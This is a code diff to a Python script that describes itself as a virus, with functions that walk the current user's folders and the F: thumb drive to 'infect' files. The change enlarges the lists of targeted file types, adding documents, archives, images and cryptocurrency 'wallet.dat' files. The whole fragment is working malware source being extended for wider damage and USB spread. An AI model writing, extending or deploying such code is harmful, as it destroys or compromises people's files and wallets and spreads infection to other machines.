@@ -22,13 +22,17 @@ targets = ('.txt', '.docx', '.doc', '.lnk',
            '.mp4', '.svg', '.ico', '.3gp',
            'ink', '.gz', '.rar', '.wav',
            '.iso', '.java', '.html', '.css',
-           '.key', '.enc')
+           '.key', '.enc', '.png', 'wallet.dat',
+           '.cvs')
 
 
 def virus_property():
     # Infect files in current user
     user = getpass.getuser()
-    target = ('txt', '.pdf', '.png', '.exe')
+    target = ('txt', '.pdf', '.png', '.exe',
+              '.docx', '.doc', '.lnk', '.zip',
+              '.ppt', '.gz', '.rar', '.jpg',
+              '.jpeg', 'gif')
     path = 'C:/Users/' + user + '/'
     for r, d, files in os.walk(path):
         for file in files:
@@ -53,7 +57,10 @@ def virus_property():
 
 def usb_infection():
     # Infect Thumb drives In F:// drive
-    target = ('txt', '.pdf', '.png', '.exe')
+    target = ('txt', '.pdf', '.png', '.exe',
+              '.docx', '.doc', '.lnk', '.zip',
+              '.ppt', '.gz', '.rar', '.jpg',
+              '.jpeg', 'gif')
     path = 'F:\\'
     try:
         for r, d, files in os.walk(path):
